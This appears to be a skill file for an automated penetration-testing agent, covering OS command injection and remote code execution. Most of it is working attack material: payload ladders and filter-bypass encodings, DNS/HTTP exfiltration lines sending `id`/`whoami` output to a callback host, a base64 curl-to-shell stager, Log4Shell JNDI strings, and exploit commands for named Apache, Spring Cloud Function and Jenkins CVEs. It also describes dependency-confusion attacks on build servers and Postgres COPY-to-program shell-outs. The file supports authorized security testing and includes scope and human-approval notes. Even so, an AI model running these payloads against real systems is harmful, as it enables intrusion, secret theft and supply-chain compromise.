---
name: Command Injection & RCE
description: Detect OS command injection in parameters that reach a shell and confirm with deterministic command output (id / Windows banner).
tags: [web, rce, command-injection, owasp-a03]
recommended_tools: [http_repeater, http_intruder, arjun_parameter_discovery, nuclei_scan, jaeles_vulnerability_scan, execute_command]
vuln_classes: [command_injection]
domain: web
phase: exploitation
---
# Command Injection & RCE

Anywhere input reaches `system()`, `exec()`, `popen()`, `Runtime.exec()`, backticks, or a shelled-out CLI.

## Where to look
- **Diagnostic/network features**: `ping`, `host`, `nslookup`, `traceroute`, `ip`, `dns`, `url`, `target`.
- **File/media ops**: `filename`, `format`, `export`, `convert`, `compress`, `archive`, `image` (ImageMagick/ffmpeg/exiftool/tar wrappers).
- **Generic sinks**: `cmd`, `exec`, `command`, `run`, `query`, `option`, `lang`, `page`.
- Headers/UA passed to shelled-out tools; `arjun_parameter_discovery` to find hidden ones.

## Payload ladder: detect -> confirm -> escalate
1. **Separators + command** (append to the original value so the base command still runs):
   - `; id`  `| id`  `& id`  `&& id`  `|| id`  `` `id` ``  `$(id)`  `%0aid`  `%0a id`
   - Newline/CRLF: `\nid`, `%0d%0aid`.  Quote-break first if reflected inside quotes: `"; id; "`, `'; id; '`.
2. **Confirm with deterministic output** — the response must contain real command output:
   - Linux: `id` -> **`uid=...gid=...`**, `uname -a`, `cat /etc/passwd` -> `root:x:0:0:`.
   - Windows: `& whoami`, `| ver` -> **Windows version banner** (e.g. `Microsoft Windows [Version 10.0...]`), `| systeminfo`.
   - Arithmetic sanity (some sandboxes): `;expr 1337 + 7` -> `1344`.
3. **Blind (no output)** — prove out-of-band or by timing:
   - Time: `; sleep 5`, `& ping -c 5 127.0.0.1`, Windows `& ping -n 5 127.0.0.1`, `|| ping -n 5 127.0.0.1`.
   - OOB DNS/HTTP to a controlled host: `; curl http://<oob>/$(id|base64)`, `; nslookup $(whoami).<oob>`, `& nslookup <oob>`.
4. **Escalate (in scope only)**: read secrets (`cat /etc/passwd`, `env`, `cat .env`), then reverse shell / `curl|bash` staging — HITL-gated.

## WAF / filter bypass
- **Spaces filtered**: `${IFS}` -> `cat${IFS}/etc/passwd`, `cat$IFS$9/etc/passwd`, `{cat,/etc/passwd}`, `<` -> `cat</etc/passwd`, tab `%09`.
- **Keyword filtered**: quotes inside cmd `i''d`, `i\d`, `wh''oami`, `c'a't`; concat `$(printf id)`; var splice `a=i;b=d;$a$b`.
- **Char blocks**: base64 `echo aWQ=|base64 -d|sh`, hex `$(printf "\x69\x64")`; backslash-newline; `${PATH:0:1}` to build `/`.
- **Encoding**: URL-encode separators (`%26%26`=`&&`, `%7c`=`|`, `%3b`=`;`), double-encode through proxies.
- **HPP / Content-Type confusion**: duplicate param, or resend body as `application/json` vs form to dodge the filter.

## Tool usage
- `http_intruder`: load the separator+command list above across the param; flag responses containing `uid=` or the Windows version banner, or with >5s delay (blind).
- `nuclei_scan` / `jaeles_vulnerability_scan`: known CMDi templates + OOB interactsh correlation for blind cases.
- `execute_command` (operator host, in scope): run the OOB listener / DNS check, or fire the crafted curl and observe the callback; verify with `id`/`whoami` semantics off-box.

## Manual http_request example
```
POST /api/ping HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

host=127.0.0.1%3B+id
```
A response body containing `uid=33(www-data) gid=33(www-data)` is in-band proof.

## Proof to capture (verifier signals)
The exact param + payload, plus **`uid=...gid=...`** (Linux `id`) or the **Windows version banner** in the response (blind: the OOB callback / measured delay). Drive payloads at `id`/`whoami`/`ver` to emit these.

## Chaining
RCE -> read app secrets/DB creds -> lateral DB/cloud access; reverse shell -> privilege escalation; SSTI/deserialization/`xp_cmdshell` all funnel here. CWE-78 / CWE-77.

**Safety**: confirm with read-only `id`/`whoami` only; reverse shells, file writes, and destructive commands are HITL-gated and scope-bound.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## Blind / OOB command injection (multi-separator, exfil in subdomain)
Cover bash + cmd contexts by rotating shell metacharacters; embed command output in the OAST subdomain label to exfil via DNS.
```
;curl http://{OAST}/$(whoami);
;wget -q http://{OAST}/$(id);
`nslookup $(whoami).{OAST}`
$(dig +short {OAST})
|ping -c1 {OAST}        &ping -n 1 {OAST}   (Windows)
;echo Y3VybCBodHRwOi8ve09BU1R9Lw==|base64 -d|sh;   (base64 filter-evasion)
```
Proof signal: OAST DNS/HTTP callback, with exfiltrated command output in the subdomain label. Bind `{OAST}` to a per-finding id.

## In-band witness payloads + defense heuristic
```
; ls -la      | whoami      `id`      $(cat /etc/passwd)      & dir      || uname -a
```
Proof signal: command output (`uid=...gid=...`, hostname, `root:x:0:0:`) reflected in response. Heuristic from white-box: secure = array args (`shell=False`) OR `shlex.quote()`; vulnerable = string concat, char blacklist, or `shell=True`. A blacklist of `&|;` is NOT a valid defense.

## Log4Shell / JNDI lookup OOB (headers + params, with obfuscation)
```
${jndi:ldap://{OAST}/a}
${jndi:dns://{OAST}/a}
${jndi:rmi://{OAST}/a}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{OAST}/a}   (WAF-evading nested lookup)
```
Inject into User-Agent, X-Forwarded-For, X-Api-Version, and every reflected param. Proof signal: OAST LDAP/DNS/RMI callback from target.

## Modern techniques & real-world CVEs (via recon-skills)

Distilled from ~67 disclosed RCE reports. Focus is on server products, config-as-code sinks, and named CVEs that reach OS command execution — not the generic separator ladder above.

### Config-as-code injection (admin/management consoles)
Web UIs that edit daemon config files pass field values straight into execution primitives. "Editor"-role auth is enough; the daemon runs as root. GHES produced 6 separate RCEs from one console role this way.
- **syslog-ng** editable `destination`: inject a `program()` destination -> daemon shells out on next log line.
```
destination d_evil { program("bash -c 'curl http://{OAST}/$(id|base64)'"); };
```
- **collectd** exec plugin config: `<Plugin exec> Exec "nobody" "/bin/sh" "-c" "id;curl http://{OAST}/"` .
- **nomad** job template (Go text/template): `{{ runscript "id" }}`, `{{ env "NOMAD_SECRET_ID" }}`, `{{ with secret "secret/data/prod" }}{{ .Data.password }}{{ end }}`.
Look for free-form fields in: log destinations, notification formats, proxy settings, plugin/exec config. Fire `{{7*7}}`/`${7*7}`/`<%= 7*7 %>` first to confirm the field is a template sink.

### Apache alias path traversal -> CGI RCE (CVE-2021-41773 / CVE-2021-42013)
Path-normalization bug in Apache 2.4.49 (41773) and its 2.4.50 patch-bypass (42013). Impact depends on which alias accepts the traversal: read-only vs full RCE on a CGI-enabled alias. When a file-read works on `/icons/`, always re-probe `/cgi-bin/` — max impact is the severity, not the average.
```bash
curl -sI http://target/ | grep -i Server        # 2.4.49 / 2.4.50 = vuln, 2.4.51+ = patched
# file read (any alias) -- --path-as-is is REQUIRED (curl normalizes %2e otherwise)
curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# RCE (cgi-enabled alias only)
curl --path-as-is -X POST -d "echo Content-Type: text/plain; echo; id; uname -a" \
  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

### Spring Cloud Function SpEL injection (CVE-2022-22963)
Spring Cloud Function <= 3.2.2 / <= 3.1.6 evaluates the `spring.cloud.function.routing-expression` header as SpEL on `/functionRouter`, unauth, before routing. Widely exposed in AWS Lambda / Cloud Run / on-prem because `/functionRouter` auto-registers.
```bash
# fingerprint: single-word function endpoints return 200 (/uppercase echoes UPPERCASE)
curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"
# exploit -- array form avoids shell-quoting breakage of .exec("id")
curl -X POST http://target:8080/functionRouter -H "Content-Type: text/plain" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
  --data "x"
```
Generalizes to any app feeding user input into `SpelExpressionParser.parseExpression()`, especially header/query routes that dodge auth filters.

### Jenkins args4j `@file` read (CVE-2024-23897 family)
Java CLIs on `args4j` default to `expandAtFiles=true`: `@filename` args are read and each line becomes an argument. Exposed over HTTP + verbose error echo = arbitrary file read. Unauth when anonymous read is on (fresh Jenkins default).
```bash
curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar
# first line leaks via 'help' too-many-args error
java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd
# full file leaks via 'connect-node' (every line echoed as a "no such agent" error)
java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd
```
Then pull crown-jewels to pivot to RCE/cred theft: `secret.key`, `secrets/master.key`, `credentials.xml` (decrypt offline with the keys), `users/*/config.xml` (API tokens, often plaintext), `jobs/*/config.xml` (inlined AWS/SSH/registry secrets). Pattern applies to any Java service exposing an args4j CLI over HTTP with verbatim arg-parse errors. Validate on >=2 commands and confirm real file content appears (not a generic 500).

### Dependency confusion -> RCE on build infra
Internal package names leaked in JS bundles / error strings / public repos, but the public registry namespace is unclaimed. Publish a higher-versioned public package with a `postinstall`/canary callback; installs on the CI farm fire it. Check unscoped names too (`internal-utils`, not just `@company/internal-utils`) — public registries serve unscoped first.
```bash
grep -rEn '"name"\s*:' node_modules/ | grep -E '@internal|@company|@private'
npm view @target-company/internal-package version 2>/dev/null   # empty = squattable
```

### ingress-nginx path/annotation injection
Attacker-controlled `spec.rules.http.paths.path` or annotations get spliced into generated nginx config.
```
# path field
/something)(;.*);#
# dangerous annotations
nginx.ingress.kubernetes.io/configuration-snippet
```

### Postgres COPY FROM PROGRAM (SQLi -> OS RCE)
When SQLi lands on Postgres and the DB user has `COPY`/superuser (common on some managed RDS/Cloud SQL admin DBs), stack a shell-out:
```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://{OAST}/$(id|base64)'; --
```
Postgres runs `/bin/sh -c <cmd>` as the `postgres` user — which often holds cloud IAM. MSSQL analogue is `xp_cmdshell`; both funnel into this skill.

### WAF keyword bypass — Ruby exec sinks
When `exec`/`system`/`popen` are filtered on the way in but the sink is Ruby:
```ruby
send(:system, "id")
method(:exec).call("id")
Kernel.send(:`, "id")
Object.const_get(:Kernel).system("id")
```

### Gate 0 — deterministic proof before reporting
Do not claim RCE without one concrete primitive demonstrated: captured `id`/`whoami` output, an OOB DNS/HTTP callback from the target with a per-finding marker, a file write, or `/etc/passwd` read. "Could lead to RCE" is Low/Medium; end-to-end demonstration is Critical. Name the crown jewels lost (source, DB/cloud creds, lateral reach, supply-chain blast radius) and make it reproducible from a single request + payload + listener. CWE-78 / CWE-77.
